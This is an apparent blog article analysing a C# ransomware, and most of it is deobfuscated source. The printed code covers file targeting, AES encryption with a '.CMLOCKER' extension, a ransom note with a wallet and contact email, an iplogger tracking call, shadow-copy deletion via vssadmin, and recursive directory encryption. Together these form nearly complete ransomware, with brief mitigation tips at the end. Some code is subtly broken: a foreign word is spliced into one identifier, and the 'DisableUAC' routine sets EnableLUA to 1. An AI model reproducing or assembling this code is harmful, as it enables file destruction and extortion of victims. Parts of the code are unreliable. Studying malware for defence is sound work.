# 🔍 Deobfuscating and Analyzing a C# Ransomware 🕵️‍♂️

This article dives into the deobfuscation and analysis of a heavily obfuscated C# ransomware. The original code uses cryptic variable names and complex string concatenations to obscure its functionality. By renaming variables and simplifying the structure, we reveal its malicious intent: encrypting files, demanding a ransom, and performing system modifications. Below, we break down the key components, provide the deobfuscated code for each critical section, and explain their roles in the ransomware's operation, with emojis to highlight key points.

---

## 🛠️ Overview of the Ransomware

The ransomware is written in C# and operates by:
- **Encrypting files** in specific user directories (e.g., Desktop, Documents, Pictures) using AES encryption.
- **Generating a ransom note** demanding Bitcoin payment for decryption.
- **Performing system modifications**, such as disabling User Account Control (UAC) and deleting volume shadow copies to hinder recovery.
- **Logging activity** via an external URL, likely for tracking victims.

The obfuscation relies on:
- Long, meaningless variable names (e.g., `UDAxFM6UUGgre9TPDi0ZfRtlYSRYyh0l`).
- Concatenated path strings to hide file system targets.
- Hardcoded cryptographic keys and configuration settings.

Let’s deobfuscate and analyze the key components step-by-step, with complete source code for each.

---

## 📂 1. File Path Construction

### 🔍 Analysis
The ransomware targets common user directories (e.g., Desktop, Documents, Downloads) by constructing paths using environment variables and string concatenation. The original code uses obfuscated variable names like `xFfM6DgfAxFM6UDAxFfM6DAxFM6UfDi0ZfR` for `C:\` and `UDAxFM6UUGgre9TPDi0ZfRtlYSRYyh0l` for `Users\`.

### 🧹 Deobfuscated Code
```csharp
public static string RootDrive = "C:\\";
public static string UsersFolder = "Users\\";
public static string Username = Environment.UserName;

public static string DesktopPath = $"{RootDrive}{UsersFolder}{Username}\\Desktop";
public static string LinksPath = $"{RootDrive}{UsersFolder}{Username}\\Links";
public static string ContactsPath = $"{RootDrive}{UsersFolder}{Username}\\Contacts";
public static string DocumentsPath = $"{RootDrive}{UsersFolder}{Username}\\Documents";
public static string DownloadsPath = $"{RootDrive}{UsersFolder}{Username}\\Downloads";
public static string PicturesPath = $"{RootDrive}{UsersFolder}{Username}\\Pictures";
public static string MusicPath = $"{RootDrive}{UsersFolder}{Username}\\Music";
public static string OneDrivePath = $"{RootDrive}{UsersFolder}{Username}\\OneDrive";
public static string SavedGamesPath = $"{RootDrive}{UsersFolder}{Username}\\Saved Games";
public static string FavoritesPath = $"{RootDrive}{UsersFolder}{Username}\\Favorites";
public static string SearchesPath = $"{RootDrive}{UsersFolder}{Username}\\Searches";
public static string VideosPath = $"{RootDrive}{UsersFolder}{Username}\\Videos";
```

### 📝 Explanation
- **Purpose**: Defines paths to user directories for encryption.
- **Deobfuscation**: Replaced cryptic names with clear ones (e.g., `DesktopPath` instead of `DAxFM6UUGgre9TPDi0ZfRtlYSRYyh0lM6UUGgre`) and used string interpolation for readability.
- **Impact**: The ransomware systematically targets files in these directories, making it critical to understand its scope.

---

## 🔐 2. File Encryption Logic

### 🔍 Analysis
The ransomware encrypts files using AES (Rijndael) with a hardcoded password (`o6806642kbM7c5`) and salt (`SALT`). It appends a `.CMLOCKER` extension to encrypted files and supports a wide range of file extensions (e.g., `.txt`, `.doc`, `.jpg`).

### 🧹 Deobfuscated Code
```csharp
public static byte[] Salt = Encoding.ASCII.GetBytes("o6806642kbM7c5");
public static int Iterations = 2000;
public static int KeySize = 256;
public static int BlockSize = 128;
public static string FileExtension = ".CMLOCKER";

public static byte[] EncryptFile(byte[] fileData, byte[] password)
{
    using (MemoryStream memoryStream = new MemoryStream())
    {
        using (RijndaelManaged rijndael = new RijndaelManaged())
        {
            rijndael.KeySize = KeySize;
            rijndael.BlockSize = BlockSize;
            Rfc2898DeriveBytes keyDerivation = new Rfc2898DeriveBytes(password, Salt, Iterations);
            rijndael.Key = keyDerivation.GetBytes(rijndael.KeySize / 8);
            rijndael.IV = keyDer учебныйivation.GetBytes(rijndael.BlockSize / 8);
            rijndael.Mode = CipherMode.CBC;

            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(), CryptoStreamMode.Write))
            {
                cryptoStream.Write(fileData, 0, fileData.Length);
                cryptoStream.Close();
            }
            return memoryStream.ToArray();
        }
    }
}

public static void EncryptFileOnDisk(string filePath, string password)
{
    byte[] fileData = File.ReadAllBytes(filePath);
    byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
    passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
    byte[] encryptedData = EncryptFile(fileData, passwordBytes);
    File.WriteAllBytes(filePath, encryptedData);
    File.Move(filePath, filePath + FileExtension);
}
```

### 📝 Explanation
- **Purpose**: Encrypts files using AES-CBC with a derived key.
- **Deobfuscation**: Renamed functions and variables (e.g., `NmbndiY3YyN2iY3YyN2R2ZAdycGNmbndiY3YyN2iY3mdiY3YyN2R2ZAdycGNmbndiY3YyN2YyN2R2ZAdycGN` to `EncryptFile`) and clarified parameters.
- **Impact**: Files are encrypted and renamed with `.CMLOCKER`, making them inaccessible without the decryption key.

---

## 📜 3. Ransom Note Generation

### 🔍 Analysis
The ransomware creates a `HELP_DECRYPT_YOUR_FILES.txt` file in each targeted directory, demanding a $980 Bitcoin payment to a specific wallet (`bc1qzpa3j6qse5xfxft2xy7h2phq04wq9pk66lllz5`) and providing an email (`leljicok@gmail.com`) for contact.

### 🧹 Deobfuscated Code
```csharp
public static string BitcoinWallet = "bc1qzpa3j6qse5xfxft2xy7h2phq04wq9pk66lllz5";
public static string ContactEmail = "leljicok@gmail.com";
public static string RansomAmount = "980";

public static void CreateRansomNote(string directory, string personalId)
{
    string[] ransomNote = new string[]
    {
        "Oops All Of your important files were encrypted Like document pictures videos etc..\r\n\r\n" +
        "Don't worry, you can return all your files!\r\n" +
        "All your files, documents, photos, databases and other important files are encrypted by a strong encryption. \r\n\r\n" +
        "How to recover files?\r\n" +
        "RSA is a asymmetric cryptographic algorithm, you need one key for encryption and one key for decryption so you need private key to recover your files. " +
        "It’s not possible to recover your files without private key.\r\n" +
        "The only method of recovering files is to purchase an unique private key. Only we can give you this key and only we can recover your files.\r\n\r\n" +
        "What guarantees you have?\r\n" +
        "As evidence, you can send us 1 file to decrypt by email We will send you a recovery file Prove that we can decrypt your file\r\n\r\n" +
        "Please You must follow these steps carefully to decrypt your files:\r\n" +
        $"Send ${RansomAmount} worth of bitcoin to wallet: {BitcoinWallet}\r\n" +
        "after payment, we will send you Decryptor software\r\n" +
        $"contact email: {ContactEmail}\r\n\r\n" +
        $"Your personal ID: {personalId}"
    };
    try
    {
        File.WriteAllLines(Path.Combine(directory, "HELP_DECRYPT_YOUR_FILES.txt"), ransomNote);
    }
    catch (Exception ex)
    {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
    }
}
```

### 📝 Explanation
- **Purpose**: Informs the victim of the encryption and ransom demands.
- **Deobfuscation**: Simplified variable names (e.g., `M6UfDi0ZfRtlYSRYyh0lM6UUGgreUUG` to `BitcoinWallet`) and formatted the note for clarity.
- **Impact**: The note pressures victims into paying, using a hardcoded Bitcoin address and email.

---

## 🌐 4. External Communication

### 🔍 Analysis
The ransomware launches a URL (`https://iplogger.com/2De1W6`) via `Process.Start`, likely to log the victim’s IP or infection details.

### 🧹 Deobfuscated Code
```csharp
public static string TrackingUrl = "https://iplogger.com/2De1W6";

public static void LogInfection()
{
    try
    {
        Process.Start(TrackingUrl);
    }
    catch (Exception ex)
    {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
    }
}
```

### 📝 Explanation
- **Purpose**: Communicates with an external server to track infections.
- **Deobfuscation**: Renamed `ZAdycGNmb2R2ZAdycGNmbndiY3YyYyN2iY3YyN2R2ZAdycGNmbndiY3Yy2iY3YyN2R2ZAdycGNmbnyN2R2ZAdycGNmbnsfdiY3YyYyN2iY3YyN2R2ZAdycGNmbndiY3Yy2iY3YyN2R2ZAdycGNmbnsf` to `LogInfection` and clarified the URL.
- **Impact**: The URL suggests the attacker collects victim data, potentially for monitoring or further extortion.

---

## 🛡️ 5. System Modifications

### 🔍 Analysis
The ransomware disables UAC and deletes volume shadow copies to prevent file recovery, using command-line executions via `ProcessStartInfo`.

### 🧹 Deobfuscated Code
```csharp
public static void DisableUAC()
{
    try
    {
        string arguments = "C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f";
        ProcessStartInfo processInfo = new ProcessStartInfo("CMD.EXE")
        {
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = false,
            UseShellExecute = true,
            Arguments = arguments,
            Verb = "runas"
        };
        Process.Start(processInfo);
    }
    catch (Exception ex)
    {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
    }
}

public static void DeleteShadowCopies()
{
    try
    {
        ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c vssadmin.exe delete shadows /all /quiet")
        {
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden
        };
        Process process = new Process { StartInfo = processInfo };
        process.Start();
    }
    catch (Exception ex)
    {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
    }
}
```

### 📝 Explanation
- **Purpose**: Modifies system settings to maximize damage and hinder recovery.
- **Deobfuscation**: Renamed functions (e.g., `ZAdycGNmb2R2ZAdycGNmbndiY3YyYyN2iY3YyN2R2ZAdycGNmbndiY3Yy2iY3YyN2R2ZAdycGNmbnyN2R2ZAdycGNmbn` to `DisableUAC`) and clarified commands.
- **Impact**: Disabling UAC reduces security prompts, and deleting shadow copies prevents restoring files from backups.

---

## 🚀 6. Main Execution Flow

### 🔍 Analysis
The `Main` method orchestrates the ransomware’s actions: initializing variables, performing system modifications, encrypting files, and logging activity. The `YyNYyN2iY3YyN2R2ZAdycGNmbndiY3YyYyN2iY3YyN2R2ZAdycGNmbndiY3Yy2iY3YyN2R2ZAdycGNmbndiY3Yy` method handles encryption across directories based on configuration flags.

### 🧹 Deobfuscated Code
```csharp
public static string Email = ContactEmail;
public static string PersonalId;
public static string EncryptionKey = mbndiY3Yy2iY3YyN2R2ZAdycGNmbnyN2R2ZAdycGNmYyYyN2iY3(30); // Random string generator

[STAThread]
public static void Main()
{
    Email = ContactEmail;
    DisableUAC();
    DeleteShadowCopies();
    EncryptDirectories();
    LogInfection();
}

public static void EncryptDirectories()
{
    try
    {
        byte[] encryptedKey = ZAdycGNmb2R2ZAdycGNmbndiY3YyYyN2iY3YyN2R2ZAdycGNmbndiY3Yy2iY3YyN2R2ZAdycGNmbnyN2R2ZAdycGNmbnsfdiY3YyYyN2iY3YyN2R2ZAdycGNmbndiY3Yy2iY3YyN2R2ZAdycGNm(Email).Encrypt(Encoding.UTF8.GetBytes(EncryptionKey), false);
        PersonalId = Convert.ToBase64String(encryptedKey);

        if (bool.Parse("True")) // lYSRYysdfsh0lgM6UUGgreUUGsfdsdgdgfgdg
        {
            foreach (string drive in Directory.GetLogicalDrives())
            {
                if (drive != "C:\\")
                {
                    EncryptDirectory(drive, EncryptionKey);
                    CreateRansomNote(drive, PersonalId);
                }
            }
        }

        if (bool.Parse("True")) EncryptDirectory(DesktopPath, EncryptionKey); CreateRansomNote(DesktopPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(LinksPath, EncryptionKey); CreateRansomNote(LinksPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(ContactsPath, EncryptionKey); CreateRansomNote(ContactsPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(DocumentsPath, EncryptionKey); CreateRansomNote(DocumentsPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(DownloadsPath, EncryptionKey); CreateRansomNote(DownloadsPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(PicturesPath, EncryptionKey); CreateRansomNote(PicturesPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(MusicPath, EncryptionKey); CreateRansomNote(MusicPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(OneDrivePath, EncryptionKey); CreateRansomNote(OneDrivePath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(SavedGamesPath, EncryptionKey); CreateRansomNote(SavedGamesPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(FavoritesPath, EncryptionKey); CreateRansomNote(FavoritesPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(SearchesPath, EncryptionKey); CreateRansomNote(SearchesPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(VideosPath, EncryptionKey); CreateRansomNote(VideosPath, PersonalId);
    }
    catch (Exception ex)
    {
        ProjectData.SetProjectError(ex);
        MessageBox.Show("ERROR");
        ProjectData.ClearProjectError();
    }
}

public static void EncryptDirectory(string directory, string password)
{
    string supportedExtensions = ".txt.doc.docx.mp3.xls.xlsx.ppt.sql.wmv.mp4.mp3.dll.jar.pptx.odt.jpg.tar.gz.bmp.pbm.rtf.png.csv.sql.mdb.sln.phpavi.mov.flv.amv.mpv.mtv.asp.aspx.html.xml.psd.pdf.exe.rv.rvx.ved.wm.wmv.TXT.JPG.rar.xwmv.wma.midi.fla.pdf.wma.ico.gif.GIF.ogg.mpg.icns.RAR.png.zip.BAT.Exe.c.exe.PNG.7z.exe.EXE.sql.mp4.7z.rar.m4a.wma.avi.wmv.csv.d3dbsp.zip.sie.sum.ibank.t13.t12.qdf.gdb.tax.pkpass.bc6.bc7.bkp.qic.bkf.sidn.sidd.mddata.itl.itdb.icxs.hvpl.hplg.hkdb.mdbackup.syncdb.gho.cas.svg.map.wmo.itm.sb.fos.mov.vdf.ztmp.sis.sid.ncf.menu.layout.dmp.blob.esm.vcf.vtf.dazip.fpk.mlx.kf.iwd.vpk.tor.psk.rim.w3x.fsh.ntl.arch00.lvl.snx.cfr.ff.vpp_pc.lrf.m2.mcmeta.vfs0.mpqge.kdb.db0.dba.rofl.hkx.bar.upk.das.iwi.litemod.asset.forge.ltx.bsa.apk.re4.sav.lbf.slm.bik.epk.rgss3a.pak.bigwallet.wotreplay.xxx.desc.py.m3u.flv.js.css.rb.png.jpeg.txt.p7c.p7b.p12.pfx.pem.crt.cer.der.x3f.srw.pef.ptx.r3d.rw2.rwl.raw.raf.orf.nrw.mrwref.mef.erf.kdc.dcr.cr2.crw.cerber.WNCRY.dsewrbg.bay.sr2.srf.arw.3fr.dng.jpe.jpg.cdr.indd.ai.eps.pdf.pdd.psd.dbf.mdf.wb2.rtf.wpd.dxg.xf.dwg.pst.vbs.accdb.mdb.pptm.pptx.ppt.xlk.xlsb.xlsm.xlsx.xls.wps.docm.docx.doc.odb.odc.odm.odp.ods.odt";

    try
    {
        string[] files = Directory.GetFiles(directory);
        string[] subdirectories = Directory.GetDirectories(directory);

        foreach (string file in files)
        {
            string extension = Path.GetExtension(file);
            if (supportedExtensions.Contains(extension))
            {
                EncryptFileOnDisk(file, password);
            }
        }

        foreach (string subdirectory in subdirectories)
        {
            EncryptDirectory(subdirectory, password);
            CreateRansomNote(subdirectory, PersonalId);
        }
    }
    catch (Exception ex)
    {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
    }
}
```

### 📝 Explanation
- **Purpose**: Coordinates the ransomware’s execution, encrypting files and leaving ransom notes.
- **Deobfuscation**: Simplified method names (e.g., `YyNYyN2iY3YyN2R2ZAdycGNmbndiY3YyYyN2iY3YyN2R2ZAdycGNmbndiY3Yy2iY3YyN2R2ZAdycGNmbndiY3Yy` to `EncryptDirectories`) and clarified conditional logic.
- **Impact**: The ransomware encrypts files across multiple directories, ensuring widespread damage.

---

## 🛑 Mitigation and Recommendations

To protect against this ransomware:
- **Backups**: Maintain regular, offline backups to restore files without paying the ransom.
- **Security Software**: Use antivirus and endpoint detection to block malicious executables.
- **User Awareness**: Educate users to avoid suspicious downloads or email attachments.
- **System Hardening**: Disable unnecessary services and enforce least privilege to limit ransomware impact.
- **Network Monitoring**: Watch for connections to suspicious URLs like `iplogger.com`.

---

## 🎉 Conclusion

Deobfuscating this C# ransomware revealed its malicious functionality: encrypting files, demanding Bitcoin, and modifying system settings. By renaming variables and simplifying logic, we made the code readable and understandable. The provided deobfuscated code snippets illustrate each component, from path construction to encryption and ransom note generation. Understanding such threats is crucial for developing effective defenses and educating users about ransomware risks. Stay vigilant! 🛡️